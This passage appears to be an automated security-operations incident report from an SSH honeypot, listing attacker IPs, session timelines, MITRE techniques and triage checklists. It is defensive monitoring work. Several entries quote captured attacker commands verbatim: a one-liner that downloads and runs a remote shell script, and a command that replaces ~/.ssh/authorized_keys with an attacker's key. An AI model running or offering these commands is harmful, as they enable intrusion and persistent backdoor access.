| `2026-07-15 02:44:16` | `cowrie.client.kex` |
| `2026-07-15 02:44:19` | `cowrie.login.success` |
| `2026-07-15 02:44:19` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132172ce2373

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-07-15 02:44 |
| **Last Seen** | 2026-07-15 02:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:44:18` | `cowrie.session.connect` |
| `2026-07-15 02:44:19` | `cowrie.client.version` |
| `2026-07-15 02:44:19` | `cowrie.client.kex` |
| `2026-07-15 02:44:20` | `cowrie.login.success` |
| `2026-07-15 02:44:21` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c98c606c45

| Field | Detail |
|---|---|
| **Source IP** | `122.224.164[.]194` |
| **First Seen** | 2026-07-15 02:44 |
| **Last Seen** | 2026-07-15 02:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:44:25` | `cowrie.session.connect` |
| `2026-07-15 02:44:26` | `cowrie.client.version` |
| `2026-07-15 02:44:26` | `cowrie.client.kex` |
| `2026-07-15 02:44:28` | `cowrie.login.success` |
| `2026-07-15 02:44:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.224.164[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.224.164[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c6d35a53db

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-07-15 02:44 |
| **Last Seen** | 2026-07-15 02:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:44:32` | `cowrie.session.connect` |
| `2026-07-15 02:44:33` | `cowrie.client.version` |
| `2026-07-15 02:44:33` | `cowrie.client.kex` |
| `2026-07-15 02:44:39` | `cowrie.login.success` |
| `2026-07-15 02:44:40` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612cb604f9cc

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-15 02:46 |
| **Last Seen** | 2026-07-15 02:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:46:41` | `cowrie.session.connect` |
| `2026-07-15 02:46:41` | `cowrie.client.version` |
| `2026-07-15 02:46:41` | `cowrie.client.kex` |
| `2026-07-15 02:46:44` | `cowrie.login.success` |
| `2026-07-15 02:46:44` | `cowrie.direct-tcpip.request` |
| `2026-07-15 02:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf8a9fa2c519

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 02:55 |
| **Last Seen** | 2026-07-15 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 02:55:01` | `cowrie.session.connect` |
| `2026-07-15 02:55:01` | `cowrie.client.version` |
| `2026-07-15 02:55:01` | `cowrie.client.kex` |
| `2026-07-15 02:55:01` | `cowrie.login.success` |
| `2026-07-15 02:55:03` | `cowrie.session.params` |
| `2026-07-15 02:55:03` | `cowrie.command.input` |
| `2026-07-15 02:55:03` | `cowrie.log.closed` |
| `2026-07-15 02:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aa54246d321

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 03:06 |
| **Last Seen** | 2026-07-15 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:06:33` | `cowrie.session.connect` |
| `2026-07-15 03:06:33` | `cowrie.client.version` |
| `2026-07-15 03:06:33` | `cowrie.client.kex` |
| `2026-07-15 03:06:34` | `cowrie.login.success` |
| `2026-07-15 03:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c60fd0f2cb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 03:06 |
| **Last Seen** | 2026-07-15 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:06:33` | `cowrie.session.connect` |
| `2026-07-15 03:06:33` | `cowrie.client.version` |
| `2026-07-15 03:06:33` | `cowrie.client.kex` |
| `2026-07-15 03:06:34` | `cowrie.login.success` |
| `2026-07-15 03:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb9e38e20cf

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 03:06 |
| **Last Seen** | 2026-07-15 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:06:41` | `cowrie.session.connect` |
| `2026-07-15 03:06:41` | `cowrie.client.version` |
| `2026-07-15 03:06:41` | `cowrie.client.kex` |
| `2026-07-15 03:06:42` | `cowrie.login.success` |
| `2026-07-15 03:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2445e1f0a9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-15 03:06 |
| **Last Seen** | 2026-07-15 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:06:42` | `cowrie.session.connect` |
| `2026-07-15 03:06:42` | `cowrie.client.version` |
| `2026-07-15 03:06:42` | `cowrie.client.kex` |
| `2026-07-15 03:06:42` | `cowrie.login.success` |
| `2026-07-15 03:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92cb894538f

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]230` |
| **First Seen** | 2026-07-15 03:07 |
| **Last Seen** | 2026-07-15 03:08 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://41.216.189[.]157/run.sh; curl -O hxxp://41.216.189[.]157/run.sh; chmod 777 run.sh; sh run.sh; rm -rf run.sh` |
| **Download Attempts** | hxxp://41.216.189[.]157/run.sh, hxxp://41.216.189[.]157/run.sh, hxxp://41.216.189[.]157/bins/xnxnxnxnxnxnxnxnaarch64xnxn |
| **Malware Analysis** | 5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884 (LOW), 5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:07:29` | `cowrie.session.connect` |
| `2026-07-15 03:07:36` | `cowrie.client.version` |
| `2026-07-15 03:07:36` | `cowrie.client.kex` |
| `2026-07-15 03:08:05` | `cowrie.login.success` |
| `2026-07-15 03:08:21` | `cowrie.session.params` |
| `2026-07-15 03:08:21` | `cowrie.command.input` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download.failed` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:22` | `cowrie.session.file_download` |
| `2026-07-15 03:08:23` | `cowrie.session.file_download` |
| `2026-07-15 03:08:23` | `cowrie.session.file_download` |
| `2026-07-15 03:08:23` | `cowrie.session.file_download` |
| `2026-07-15 03:08:23` | `cowrie.session.file_download` |
| `2026-07-15 03:08:27` | `cowrie.log.closed` |
| `2026-07-15 03:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]230` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e158989bef

| Field | Detail |
|---|---|
| **Source IP** | `27.128.162[.]146` |
| **First Seen** | 2026-07-15 03:09 |
| **Last Seen** | 2026-07-15 03:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:09:14` | `cowrie.session.connect` |
| `2026-07-15 03:09:15` | `cowrie.client.version` |
| `2026-07-15 03:09:15` | `cowrie.client.kex` |
| `2026-07-15 03:09:18` | `cowrie.login.success` |
| `2026-07-15 03:09:19` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `27.128.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eab572975b6

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-15 03:09 |
| **Last Seen** | 2026-07-15 03:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:09:25` | `cowrie.session.connect` |
| `2026-07-15 03:09:26` | `cowrie.client.version` |
| `2026-07-15 03:09:26` | `cowrie.client.kex` |
| `2026-07-15 03:09:28` | `cowrie.login.success` |
| `2026-07-15 03:09:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea02e4b867d

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-07-15 03:09 |
| **Last Seen** | 2026-07-15 03:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:09:26` | `cowrie.session.connect` |
| `2026-07-15 03:09:26` | `cowrie.client.version` |
| `2026-07-15 03:09:26` | `cowrie.client.kex` |
| `2026-07-15 03:09:27` | `cowrie.login.success` |
| `2026-07-15 03:09:28` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96a694ca6493

| Field | Detail |
|---|---|
| **Source IP** | `201.163.73[.]88` |
| **First Seen** | 2026-07-15 03:09 |
| **Last Seen** | 2026-07-15 03:14 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:09:33` | `cowrie.session.connect` |
| `2026-07-15 03:09:33` | `cowrie.client.version` |
| `2026-07-15 03:09:33` | `cowrie.client.kex` |
| `2026-07-15 03:09:34` | `cowrie.login.success` |
| `2026-07-15 03:09:35` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:14:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.163.73[.]88` to AbuseIPDB if not already reported
- [ ] Block `201.163.73[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2ddfe6362b

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-15 03:27 |
| **Last Seen** | 2026-07-15 03:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:27:44` | `cowrie.session.connect` |
| `2026-07-15 03:27:44` | `cowrie.client.version` |
| `2026-07-15 03:27:44` | `cowrie.client.kex` |
| `2026-07-15 03:27:46` | `cowrie.login.success` |
| `2026-07-15 03:27:47` | `cowrie.session.params` |
| `2026-07-15 03:27:47` | `cowrie.command.input` |
| `2026-07-15 03:27:47` | `cowrie.command.failed` |
| `2026-07-15 03:27:47` | `cowrie.log.closed` |
| `2026-07-15 03:27:48` | `cowrie.session.params` |
| `2026-07-15 03:27:48` | `cowrie.command.input` |
| `2026-07-15 03:27:48` | `cowrie.session.file_download` |
| `2026-07-15 03:27:48` | `cowrie.log.closed` |
| `2026-07-15 03:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f275fc1c33

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-15 03:27 |
| **Last Seen** | 2026-07-15 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:27:48` | `cowrie.session.connect` |
| `2026-07-15 03:27:48` | `cowrie.client.version` |
| `2026-07-15 03:27:49` | `cowrie.client.kex` |
| `2026-07-15 03:27:50` | `cowrie.login.success` |
| `2026-07-15 03:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9584aaf6d06

| Field | Detail |
|---|---|
| **Source IP** | `220.250.52[.]101` |
| **First Seen** | 2026-07-15 03:27 |
| **Last Seen** | 2026-07-15 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:27:50` | `cowrie.session.connect` |
| `2026-07-15 03:27:50` | `cowrie.client.version` |
| `2026-07-15 03:27:51` | `cowrie.client.kex` |
| `2026-07-15 03:27:52` | `cowrie.login.success` |
| `2026-07-15 03:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.250.52[.]101` to AbuseIPDB if not already reported
- [ ] Block `220.250.52[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b8e6e4eb742

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 03:30 |
| **Last Seen** | 2026-07-15 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:30:40` | `cowrie.session.connect` |
| `2026-07-15 03:30:40` | `cowrie.client.version` |
| `2026-07-15 03:30:40` | `cowrie.client.kex` |
| `2026-07-15 03:30:40` | `cowrie.login.success` |
| `2026-07-15 03:30:41` | `cowrie.session.params` |
| `2026-07-15 03:30:41` | `cowrie.command.input` |
| `2026-07-15 03:30:41` | `cowrie.log.closed` |
| `2026-07-15 03:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ff45568e41

| Field | Detail |
|---|---|
| **Source IP** | `41.216.178[.]119` |
| **First Seen** | 2026-07-15 03:30 |
| **Last Seen** | 2026-07-15 03:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:30:43` | `cowrie.session.connect` |
| `2026-07-15 03:30:43` | `cowrie.client.version` |
| `2026-07-15 03:30:43` | `cowrie.client.kex` |
| `2026-07-15 03:30:44` | `cowrie.login.success` |
| `2026-07-15 03:30:45` | `cowrie.session.params` |
| `2026-07-15 03:30:45` | `cowrie.command.input` |
| `2026-07-15 03:30:45` | `cowrie.command.failed` |
| `2026-07-15 03:30:46` | `cowrie.log.closed` |
| `2026-07-15 03:30:47` | `cowrie.session.params` |
| `2026-07-15 03:30:47` | `cowrie.command.input` |
| `2026-07-15 03:30:47` | `cowrie.session.file_download` |
| `2026-07-15 03:30:47` | `cowrie.log.closed` |
| `2026-07-15 03:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.178[.]119` to AbuseIPDB if not already reported
- [ ] Block `41.216.178[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e07ad414dfd

| Field | Detail |
|---|---|
| **Source IP** | `41.216.178[.]119` |
| **First Seen** | 2026-07-15 03:30 |
| **Last Seen** | 2026-07-15 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:30:47` | `cowrie.session.connect` |
| `2026-07-15 03:30:47` | `cowrie.client.version` |
| `2026-07-15 03:30:47` | `cowrie.client.kex` |
| `2026-07-15 03:30:48` | `cowrie.login.success` |
| `2026-07-15 03:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.178[.]119` to AbuseIPDB if not already reported
- [ ] Block `41.216.178[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15cfd3f7a355

| Field | Detail |
|---|---|
| **Source IP** | `41.216.178[.]119` |
| **First Seen** | 2026-07-15 03:30 |
| **Last Seen** | 2026-07-15 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:30:49` | `cowrie.session.connect` |
| `2026-07-15 03:30:49` | `cowrie.client.version` |
| `2026-07-15 03:30:49` | `cowrie.client.kex` |
| `2026-07-15 03:30:50` | `cowrie.login.success` |
| `2026-07-15 03:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.178[.]119` to AbuseIPDB if not already reported
- [ ] Block `41.216.178[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74c97e9c1034

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]128` |
| **First Seen** | 2026-07-15 03:31 |
| **Last Seen** | 2026-07-15 03:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:31:44` | `cowrie.session.connect` |
| `2026-07-15 03:31:45` | `cowrie.client.version` |
| `2026-07-15 03:31:45` | `cowrie.client.kex` |
| `2026-07-15 03:31:47` | `cowrie.login.success` |
| `2026-07-15 03:31:48` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4605f6a16a45

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-07-15 03:31 |
| **Last Seen** | 2026-07-15 03:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 03:31:59` | `cowrie.session.connect` |
| `2026-07-15 03:31:59` | `cowrie.client.version` |
| `2026-07-15 03:31:59` | `cowrie.client.kex` |
| `2026-07-15 03:32:02` | `cowrie.login.success` |
| `2026-07-15 03:32:03` | `cowrie.direct-tcpip.request` |
| `2026-07-15 03:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08935224b36

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 03:32 |
| **Last Seen** | 2026-07-15 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
